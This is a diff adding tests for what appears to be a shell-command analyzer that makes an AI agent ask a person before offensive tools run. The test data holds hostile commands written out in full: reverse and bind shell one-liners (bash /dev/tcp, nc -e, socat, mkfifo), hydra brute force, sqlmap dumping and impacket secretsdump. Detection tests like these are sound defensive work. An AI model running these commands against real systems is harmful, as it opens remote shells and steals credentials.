@@ -246,3 +246,34 @@ describe("an ask shows how the run got here, and the receipt records the answer"
     expect(answers.get(c.receiptId)).toBe("awaiting an answer");
   });
 });
+
+describe("offensive tooling", () => {
+  const a = (c) => analyzeShell(c, { home: "/home/u" });
+  it("recognizes scanners, frameworks, credential attacks and impacket scripts", () => {
+    expect(a("nmap -sV -p- 10.0.0.5").offensiveTool).toBe(true);
+    expect(a("sqlmap -u https://x/item?id=1 --batch --dump").offensiveTool).toBe(true);
+    expect(a("hashcat -m 22000 hash.hc wordlist.txt").offensiveTool).toBe(true);
+    expect(a("hydra -l admin -P rockyou.txt ssh://10.0.0.5").offensiveTool).toBe(true);
+    expect(a("python3 secretsdump.py corp/user@10.0.0.5").offensiveTool).toBe(true);
+    expect(a("ffuf -u https://x/FUZZ -w words.txt").offensiveTool).toBe(true);
+    expect(a("nmap 10.0.0.5").ops).toContain("offensive:nmap");
+  });
+  it("recognizes reverse and bind shells by shape", () => {
+    expect(a("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").offensiveTool).toBe(true);
+    expect(a("nc -e /bin/sh 10.0.0.1 4444").offensiveTool).toBe(true);
+    expect(a("socat TCP:10.0.0.1:4444 EXEC:/bin/bash").offensiveTool).toBe(true);
+    expect(a("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f").offensiveTool).toBe(true);
+  });
+  it("does not flag ordinary development", () => {
+    expect(a("npm test").offensiveTool).toBe(false);
+    expect(a("curl -s https://api.example.com").offensiveTool).toBe(false);
+    expect(a("nc -z localhost 3000").offensiveTool).toBe(false); // a plain port check, no -e/-c
+    expect(a("git clone https://github.com/nmap/nmap").offensiveTool).toBe(false); // the word in a URL is not the tool
+    expect(a("echo 'run nmap later'").offensiveTool).toBe(false);
+  });
+  it("asks a person before running an offensive tool, and names it", () => {
+    const d = y.decide(req("pt", "Bash", { command: "nmap -sV 10.0.0.5" }));
+    expect(d.effect).toBe("ask");
+    expect(d.reasons).toContain("approve:offensive-tooling");
+  });
+});
